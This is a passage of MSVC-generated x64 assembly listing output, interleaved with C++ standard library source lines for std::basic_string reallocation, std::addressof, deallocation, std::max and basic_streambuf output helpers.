	cmp	rax, QWORD PTR _Size_increase$[rsp]
	jae	SHORT $LN2@Reallocate

; 4808 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Reallocate:

; 4809 :         }
; 4810 : 
; 4811 :         const size_type _New_size     = _Old_size + _Size_increase;

	mov	rax, QWORD PTR _Size_increase$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _New_size$[rsp], rax

; 4812 :         const size_type _Old_capacity = _My_data._Myres;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR _Old_capacity$[rsp], rax

; 4813 :         const size_type _New_capacity = _Calculate_growth(_New_size);

	mov	rdx, QWORD PTR _New_size$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 4814 :         auto& _Al                     = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 4815 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 4816 : 
; 4817 : #if _HAS_CXX20
; 4818 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 4819 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 4820 :         }
; 4821 : #endif // _HAS_CXX20
; 4822 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_size$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 4825 :         _My_data._Myres       = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	QWORD PTR _Raw_new$[rsp], rax

; 4827 :         if (_BUF_SIZE <= _Old_capacity) {

	cmp	QWORD PTR _Old_capacity$[rsp], 16
	jb	$LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Old_ptr$1[rsp], rax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

	mov	rcx, QWORD PTR _Old_ptr$1[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	movzx	ecx, BYTE PTR <_Args_2>$[rsp]
	mov	BYTE PTR [rsp+48], cl
	mov	rcx, QWORD PTR <_Args_1>$[rsp]
	mov	QWORD PTR [rsp+40], rcx
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z ; <lambda_b986da8d428e4af07c64af60eec09b61>::operator()

; 4830 :             _Al.deallocate(_Old_ptr, _Old_capacity + 1);

	mov	rax, QWORD PTR _Old_capacity$[rsp]
	inc	rax
	mov	r8, rax
	mov	rdx, QWORD PTR _Old_ptr$1[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	mov	QWORD PTR [rax], rcx

; 4832 :         } else {

	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

	mov	rax, QWORD PTR _My_data$[rsp]
	movzx	ecx, BYTE PTR <_Args_2>$[rsp]
	mov	BYTE PTR [rsp+48], cl
	mov	rcx, QWORD PTR <_Args_1>$[rsp]
	mov	QWORD PTR [rsp+40], rcx
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z ; <lambda_b986da8d428e4af07c64af60eec09b61>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

	mov	rax, QWORD PTR this$[rsp]
$LN5@Reallocate:

; 4839 :     }

	add	rsp, 152				; 00000098H
	ret	0
??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_b986da8d428e4af07c64af60eec09b61>,unsigned __int64,unsigned __int64,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z
_TEXT	SEGMENT
tv78 = 32
this$ = 64
_New_ptr$ = 72
_Old_ptr$ = 80
_Old_size$ = 88
_Off$ = 96
_Count$ = 104
_Ch$ = 112
??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z PROC ; <lambda_b986da8d428e4af07c64af60eec09b61>::operator(), COMDAT

; 3623 :             },

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 3620 :                 _Traits::copy(_New_ptr, _Old_ptr, _Off);

	mov	r8, QWORD PTR _Off$[rsp]
	mov	rdx, QWORD PTR _Old_ptr$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 3621 :                 _Traits::assign(_New_ptr + _Off, _Count, _Ch);

	mov	rax, QWORD PTR _Off$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movzx	r8d, BYTE PTR _Ch$[rsp]
	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3622 :                 _Traits::copy(_New_ptr + _Off + _Count, _Old_ptr + _Off, _Old_size - _Off + 1);

	mov	rax, QWORD PTR _Off$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	inc	rax
	mov	rcx, QWORD PTR _Off$[rsp]
	mov	rdx, QWORD PTR _Old_ptr$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	mov	rdx, QWORD PTR _Off$[rsp]
	mov	r8, QWORD PTR _New_ptr$[rsp]
	add	r8, rdx
	mov	rdx, r8
	add	rdx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR tv78[rsp], rdx
	mov	r8, rax
	mov	rdx, rcx
	mov	rax, QWORD PTR tv78[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 3623 :             },

	add	rsp, 56					; 00000038H
	ret	0
??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z ENDP ; <lambda_b986da8d428e4af07c64af60eec09b61>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@D@std@@@0@AEBV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@D@std@@@0@AEBV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<char> > const >, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@D@std@@@0@AEBV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<char> > const >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@D@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@D@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<char> > >, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@D@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<char> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@$$CBV?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@_W@std@@@0@AEBV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@$$CBV?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@_W@std@@@0@AEBV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > const >, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@$$CBV?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@_W@std@@@0@AEBV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > const >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
_TEXT	SEGMENT
_Ptr$ = 48
_Bytes$ = 56
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z PROC		; std::_Deallocate<16,0>, COMDAT

; 244  : _CONSTEXPR20 void _Deallocate(void* _Ptr, size_t _Bytes) noexcept {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 245  :     // deallocate storage allocated by _Allocate when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 246  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 247  :     if (_STD is_constant_evaluated()) {
; 248  :         ::operator delete(_Ptr);
; 249  :     } else
; 250  : #endif // _HAS_CXX20
; 251  :     {
; 252  : #if defined(_M_IX86) || defined(_M_X64)
; 253  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

	cmp	QWORD PTR _Bytes$[rsp], 4096		; 00001000H
	jb	SHORT $LN2@Deallocate

; 254  :             _Adjust_manually_vector_aligned(_Ptr, _Bytes);

	lea	rdx, QWORD PTR _Bytes$[rsp]
	lea	rcx, QWORD PTR _Ptr$[rsp]
	call	?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
$LN2@Deallocate:

; 255  :         }
; 256  : #endif // defined(_M_IX86) || defined(_M_X64)
; 257  :         ::operator delete(_Ptr, _Bytes);

	mov	rdx, QWORD PTR _Bytes$[rsp]
	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1

; 258  :     }
; 259  : }

	add	rsp, 40					; 00000028H
	ret	0
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ENDP		; std::_Deallocate<16,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\utility
;	COMDAT ??$max@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
tv65 = 0
$T1 = 8
_Left$ = 32
_Right$ = 40
??$max@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::max<unsigned __int64>, COMDAT

; 41   :     (max) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Left < _Right)) /* strengthened */ {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 42   :     // return larger of _Left and _Right
; 43   :     return _Left < _Right ? _Right : _Left;

	mov	rax, QWORD PTR _Left$[rsp]
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR [rcx]
	cmp	QWORD PTR [rax], rcx
	jae	SHORT $LN3@max
	mov	rax, QWORD PTR _Right$[rsp]
	mov	QWORD PTR tv65[rsp], rax
	jmp	SHORT $LN4@max
$LN3@max:
	mov	rax, QWORD PTR _Left$[rsp]
	mov	QWORD PTR tv65[rsp], rax
$LN4@max:
	mov	rax, QWORD PTR tv65[rsp]
	mov	QWORD PTR $T1[rsp], rax
	mov	rax, QWORD PTR $T1[rsp]

; 44   : }

	add	rsp, 24
	ret	0
??$max@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::max<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ
_TEXT	SEGMENT
tv69 = 0
this$ = 32
?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ PROC ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail, COMDAT

; 257  :     streamsize __CLR_OR_THIS_CALL _Pnavail() const { // count number of available positions in write buffer

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 258  :         return *_IPnext ? *_IPcount : 0;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+64]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN3@Pnavail
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+88]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR tv69[rsp], eax
	jmp	SHORT $LN4@Pnavail
$LN3@Pnavail:
	mov	DWORD PTR tv69[rsp], 0
$LN4@Pnavail:
	movsxd	rax, DWORD PTR tv69[rsp]

; 259  :     }

	add	rsp, 24
	ret	0
?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ
_TEXT	SEGMENT
tv76 = 0
this$ = 32
?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ PROC ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc, COMDAT

; 252  :     _Elem* __CLR_OR_THIS_CALL _Pninc() { // increment current position in write buffer

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 253  :         --*_IPcount;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+88]
	mov	eax, DWORD PTR [rax]
	dec	eax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+88]
	mov	DWORD PTR [rcx], eax

; 254  :         return (*_IPnext)++;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+64]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR tv76[rsp], rax
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+64]
	mov	rax, QWORD PTR [rax]
	inc	rax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+64]
	mov	QWORD PTR [rcx], rax
	mov	rax, QWORD PTR tv76[rsp]

; 255  :     }

	add	rsp, 24
	ret	0
?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
_Count$ = 64
?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z PROC ; std::basic_streambuf<char,std::char_traits<char> >::sputn, COMDAT

; 171  :         streamsize _Count) { // put _Count characters from array beginning at _Ptr

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 172  :         return xsputn(_Ptr, _Count);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+72]

; 173  :     }

	add	rsp, 40					; 00000028H
	ret	0
?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z ENDP ; std::basic_streambuf<char,std::char_traits<char> >::sputn
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z
_TEXT	SEGMENT
tv78 = 32
$T1 = 40
tv79 = 48
this$ = 80
_Ch$ = 88
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z PROC ; std::basic_streambuf<char,std::char_traits<char> >::sputc, COMDAT

; 166  :     int_type __CLR_OR_THIS_CALL sputc(_Elem _Ch) { // put a character

$LN5:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 167  :         return 0 < _Pnavail() ? _Traits::to_int_type(*_Pninc() = _Ch) : overflow(_Traits::to_int_type(_Ch));

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
	test	rax, rax
	jle	SHORT $LN3@sputc
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
	mov	QWORD PTR $T1[rsp], rax
	mov	rax, QWORD PTR $T1[rsp]
	movzx	ecx, BYTE PTR _Ch$[rsp]
	mov	BYTE PTR [rax], cl
	mov	rcx, QWORD PTR $T1[rsp]
	call	?to_int_type@?$_Narrow_char_traits@DH@std@@SAHAEBD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
	mov	DWORD PTR tv78[rsp], eax
	jmp	SHORT $LN4@sputc
$LN3@sputc:
	lea	rcx, QWORD PTR _Ch$[rsp]
	call	?to_int_type@?$_Narrow_char_traits@DH@std@@SAHAEBD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	QWORD PTR tv79[rsp], rcx
	mov	edx, eax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR tv79[rsp]
	call	QWORD PTR [rax+24]
	mov	DWORD PTR tv78[rsp], eax
$LN4@sputc:
	mov	eax, DWORD PTR tv78[rsp]

; 168  :     }

	add	rsp, 72					; 00000048H
	ret	0
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ENDP ; std::basic_streambuf<char,std::char_traits<char> >::sputc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ
_TEXT	SEGMENT
this$ = 48
?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ PROC ; std::basic_streambuf<char,std::char_traits<char> >::pubsync, COMDAT

; 121  :     int __CLR_OR_THIS_CALL pubsync() { // synchronize with external agent

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 122  :         return sync();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+104]

; 123  :     }

	add	rsp, 40					; 00000028H
	ret	0
?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$_Unfancy@D@std@@YAPEADPEAD@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy@D@std@@YAPEADPEAD@Z PROC			; std::_Unfancy<char>, COMDAT

; 265  : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

	mov	QWORD PTR [rsp+8], rcx

; 266  :     return _Ptr;

	mov	rax, QWORD PTR _Ptr$[rsp]

; 267  : }

	ret	0
??$_Unfancy@D@std@@YAPEADPEAD@Z ENDP			; std::_Unfancy<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z
_TEXT	SEGMENT
$T1 = 32
_Obj$ = 64
<_Args_0>$ = 72
??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z PROC ; std::_Construct_in_place<char *,char * &>, COMDAT

; 231  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 232  : #if _HAS_CXX20
; 233  :     if (_STD is_constant_evaluated()) {
; 234  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 235  :     } else
; 236  : #endif // _HAS_CXX20
; 237  :     {
; 238  :         ::new (_Voidify_iter(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Obj$[rsp]
	call	??$addressof@PEAD@std@@YAPEAPEADAEAPEAD@Z ; std::addressof<char *>
	mov	rcx, rax
	call	??$_Voidify_iter@PEAPEAD@std@@YAPEAXPEAPEAD@Z ; std::_Voidify_iter<char * *>
	mov	rdx, rax
	mov	ecx, 8
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEAPEAD@std@@YAAEAPEADAEAPEAD@Z ; std::forward<char * &>
	mov	rcx, QWORD PTR $T1[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR [rcx], rax

; 239  :     }
; 240  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z ENDP ; std::_Construct_in_place<char *,char * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z
_TEXT	SEGMENT
_My_data$ = 48
_Old_size$ = 56
_New_ptr$ = 64
_New_size$ = 72
_New_capacity$ = 80
_Old_capacity$ = 88
_Old_ptr$1 = 96
_Al$ = 104
_Raw_new$ = 112
this$ = 144
_Size_increase$ = 152
_Fn$ = 160
<_Args_0>$ = 168
<_Args_1>$ = 176
??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_65e615be2a453ca0576c979606f46740>,char const *,unsigned __int64>, COMDAT

; 4802 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

$LN6:
	mov	QWORD PTR [rsp+32], r9
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 136				; 00000088H

; 4803 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4804 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
